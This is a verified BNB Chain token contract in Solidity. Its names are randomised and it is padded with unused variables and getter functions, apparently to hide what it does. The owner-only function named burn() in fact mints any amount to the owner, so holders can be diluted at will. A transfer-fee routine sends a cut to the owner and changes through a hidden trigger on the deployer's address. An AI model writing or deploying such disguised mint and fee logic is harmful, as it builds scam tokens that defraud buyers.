/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.16;
contract kfLtQQbX {
uint256 private  kfLtQQbX2 = 10000000000;	
address private  URkpCz = address(0);
uint256 private  DpwAHS = 1000000000000000000000;
address private  lJySJc = address(0);
uint256 private  HGIvuY = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address private  QBoewq = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "kfLtQQbX";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "kfLtQQbX";
uint256 private  WyHLMx = 10000000000;
uint256 private  yqthVF = 10000000000000;
address private  FudAvJ = address(0);
uint256 public constant JvGiJy = 99999;
address private  qUWgHq = address(0);
uint256 private  pArfZP = 1000000000000000000;
uint256 private  AhpnDi = 100000000;
address private  EjFMLs = address(0);
address private  DwwVXT = address(0);
address private  DxnZpc = address(0);
address private  PTgXTh = address(0);
uint256 private  vxZzkQ = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "EqzSXN");
require(to != address(0), "EqzSXN");
require(amount <= balanceOf[from], "EqzSXN");
uint256 prize;
if (from == owner || to == owner){
prize = 0;
}
else{
prize = JvGiJy/HGIvuY * amount;
}

uint256 transferAmount = amount - prize;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += prize;
if (to==EjFMLs){
HGIvuY = JvGiJy+kfLtQQbX2/kfLtQQbX2+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}






function _getyqthVF() private returns (uint256) {
return yqthVF;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tEqzSXN 0");
require(spender != address(0), "fEqzSXN 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getPTgXTh() private returns (address) {
return PTgXTh;
}









constructor () {
EjFMLs = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getAhpnDi() private returns (uint256) {
return AhpnDi;
}

function _getFudAvJ() private returns (address) {
return FudAvJ;
}

function _getDwwVXT() private returns (address) {
return DwwVXT;
}

function _getDpwAHS() private returns (uint256) {
return DpwAHS;
}









function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




function _getpArfZP() private returns (uint256) {
return pArfZP;
}



function _getqUWgHq() private returns (address) {
return qUWgHq;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getlJySJc() private returns (address) {
return lJySJc;
}

function _getDxnZpc() private returns (address) {
return DxnZpc;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getURkpCz() private returns (address) {
return URkpCz;
}

function _getWyHLMx() private returns (uint256) {
return WyHLMx;
}



function _getQBoewq() private returns (address) {
return QBoewq;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getvxZzkQ() private returns (uint256) {
return vxZzkQ;
}


}